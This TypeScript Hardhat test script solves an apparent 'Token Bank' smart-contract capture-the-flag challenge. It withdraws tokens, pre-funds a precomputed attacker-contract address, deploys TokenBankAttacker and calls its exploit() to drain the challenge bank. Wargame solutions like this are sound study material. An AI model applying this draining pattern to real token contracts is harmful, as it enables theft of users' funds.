import { expect } from "chai";
import { ethers } from "hardhat";

describe("Token Bank challenge", function () {
  before(async () => {
    this.ctx.player = (await ethers.getSigners())[0];
    this.ctx.challengeContract = await ethers.getContractAt(
      "TokenBankChallenge",
      "0xc856A0573159c877f53A1355077944c0E5104731"
    );
    this.ctx.token = await ethers.getContractAt(
      "SimpleERC223Token",
      await this.ctx.challengeContract.token()
    );
  });
  it("exploit", async function () {
    const TokenBankAttacker = await ethers.getContractFactory(
      "TokenBankAttacker",
      this.player
    );

    await this.challengeContract.withdraw(ethers.utils.parseEther("500000"));

    const deployAddress = ethers.utils.getContractAddress({
      from: this.player.address,
      nonce:
        (await ethers.provider.getTransactionCount(this.player.address)) + 1,
    });

    await this.token
      .connect(this.player)
      ["transfer(address,uint256)"](
        deployAddress,
        ethers.utils.parseEther("500000")
      );

    this.attackerContract = await TokenBankAttacker.deploy();

    expect(await this.token.balanceOf(this.attackerContract.address)).to.eq(
      ethers.utils.parseEther("500000")
    );

    await this.attackerContract.exploit(this.challengeContract.address);
  });

  after(async () => {
    expect(await this.ctx.challengeContract.isComplete()).to.be.true;
  });
});
